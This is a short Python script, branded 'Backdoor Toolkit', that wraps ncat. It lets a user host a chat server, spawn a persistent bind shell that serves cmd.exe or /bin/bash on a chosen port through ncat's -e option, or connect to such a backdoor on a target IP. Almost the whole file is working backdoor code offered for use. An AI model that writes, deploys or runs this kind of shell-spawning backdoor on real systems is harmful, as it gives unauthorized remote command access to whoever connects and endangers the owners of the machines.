#!/usr/bin/python

#This line imports the subprocess module so the user can invoke shell commands using subprocess.call and subprocess.Popen
import subprocess
import pyfiglet

from pyfiglet import Figlet
custom_fig = Figlet(font='crawford')
print(custom_fig.renderText('Backdoor\nToolkit'))

#These two variables allow the user to select a specific shell
windows_shell = "cmd.exe"
linux_shell = "/bin/bash"

#These two variables set the IP and PORT numbers
target_ip = raw_input("\nEnter TARGET IP:  ")
target_port = raw_input("\nEnter TARGET PORT:  ")

#This If-Else statement allows the user to choose between Linux and Windows
target_shell = raw_input("\nEnter target Operating System: \n(Windows or Linux) ")
if target_shell == "WINDOWS" or target_shell == "windows" or target_shell == "Windows":
	target_shell = windows_shell
elif target_shell == "LINUX" or target_shell == "linux" or target_shell == "Linux":
	target_shell = linux_shell

#This uses a subprocess call to run the command "clear" to keep the program's output nice and clean
#subprocess.call(["clear"])

#This If-Else statement prompts the user to host a Chatroom Server
chat_room = raw_input("\nWould you like to host a Chat Server?\n(yes or no) ")
if chat_room == "yes" or chat_room == "YES" or chat_room == "Yes":
	chat_room_port = raw_input("\nEnter port number for Chat Server: ")
#	subprocess.call(["clear"])
	subprocess.Popen(["ncat", "-l", "-k", "--chat", "-p"+chat_room_port])
	print "\nChat server succesfully hosted. \nTo connect to the Chat Server - run the command:  ncat", target_ip, chat_room_port
elif chat_room == "no" or chat_room == "NO" or chat_room == "No":
	print "\n"

#This If-Else statement prompts the user to host a backdoor or connect with an existing backdoor
answer = raw_input("\nType SPAWN to host backdoor. \nType CONNECT to interact with existing backdoor. \n-->  ")
if answer == "spawn" or answer == "SPAWN" or answer == "Spawn":
	subprocess.Popen(["ncat", "-l", "-k", "-p"+target_port, "-e"+target_shell])
	print "Backdoor Shell succesfully spawned on %s:%s" %(target_ip, target_port)
elif answer == "CONNECT" or answer == "Connect" or answer == "connect":
	subprocess.call(["ncat", target_ip, target_port])

